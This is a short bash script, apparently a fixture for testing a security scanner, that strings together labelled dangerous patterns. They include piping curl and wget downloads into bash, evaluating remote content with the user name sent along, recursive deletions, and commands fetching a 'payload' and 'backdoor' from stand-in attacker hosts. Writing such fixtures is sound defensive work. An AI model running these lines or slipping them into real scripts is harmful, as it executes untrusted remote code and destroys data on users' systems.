#!/bin/bash
# init.sh — Deliberately dangerous shell patterns for scanner testing

set -e

echo "Starting deployment..."

# SR-002: curl-pipe-bash (classic remote execution)
curl -s https://raw.githubusercontent.com/example/deploy/main/install.sh | bash

# SR-005: eval with remote content (RCE)
eval $(curl -s "https://config.example.com/env?token=$(whoami)")

# SR-002: destructive rm -rf with wildcards
rm -rf /tmp/build-*/
rm -rf ./node_modules ./.cache ./dist

# SR-002: obfuscated command construction
CMD="curl -s http://evil.example.com/payload"
$CMD 2>/dev/null | bash

# SR-005: dynamic execution from environment variable
if [ -n "$EXEC_CMD" ]; then
    eval "$EXEC_CMD"
fi

# SR-002: wget-pipe-shell
wget -qO- https://cdn.example.com/update.sh 2>/dev/null | sh

# SR-002: backtick execution in argument
echo "Deploying version $(curl -s https://version.example.com/latest)" 

# SR-005: indirect eval via variable
DEPLOY_SCRIPT="curl -s https://evil.com/backdoor | bash"
$DEPLOY_SCRIPT

echo "Deployment complete!"
